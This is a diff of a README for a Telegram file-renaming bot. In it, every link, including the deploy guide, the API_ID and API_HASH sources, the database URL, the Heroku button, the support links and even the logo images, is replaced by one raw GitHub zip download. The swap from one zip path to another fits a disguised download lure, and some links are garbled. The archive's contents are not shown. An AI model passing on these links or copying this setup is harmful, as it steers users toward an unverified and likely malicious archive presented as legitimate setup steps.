@@ -3,27 +3,27 @@
 Telegram File Renamer Bot 
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
-    <img src="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
+  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
 
   </a>
 </p>
 </p>
 
-## [How To Deploy](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip)
+## [How To Deploy](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip)
 
 
 ## Configs 
 
 * TG_BOT_TOKEN  - Get bot token from @BotFather
 
-* API_ID        - From https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip 
+* API_ID        - From https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip 
 
-* API_HASH      - From https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip 
+* API_HASH      - From https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip 
 
 * ADMIN         - Your User ID 
 
-* DATABASE_URI  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip
+* DATABASE_URI  - Mongo Database URL from https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip
 
 * DATABASE_NAME  - Your database name from mongoDB. Default will be 'my'
 
@@ -36,7 +36,7 @@ Telegram File Renamer Bot
 * `/broadcast` reply to message
 
 ### Deploy to Heroku
-[![Deploy](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip)](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip)
+[![Deploy](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip)](https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip)
 
 ## License
 ````
@@ -49,23 +49,23 @@ and larger works may be distributed under different terms and without source cod
 ````
 
 ## Support 🇮🇳
-<a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
    <p> Telegram </p>
   </a>
-<a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
+<a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
    <p> YouTube </p>
   </a>
 
 ## Credits
 
 <p align="left">
-  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
-    <img alt="Pyrogram" src ="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip" width="104.75" height="32"/>
+  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
+    <img alt="Pyrogram" src ="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip" width="104.75" height="32"/>
   </a>
 </p>
 
 <p align="left">
-  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip">
-    <img alt="MongoDB" src ="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip%https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/Cycadophyta/RENAMER_BOT.zip"/>
+  <a href="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip">
+    <img alt="MongoDB" src ="https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip%https://raw.githubusercontent.com/HLECTER69/RENAMER_BOT/main/helper/BOT-RENAME-2.4.zip"/>
   </a>
 </p>
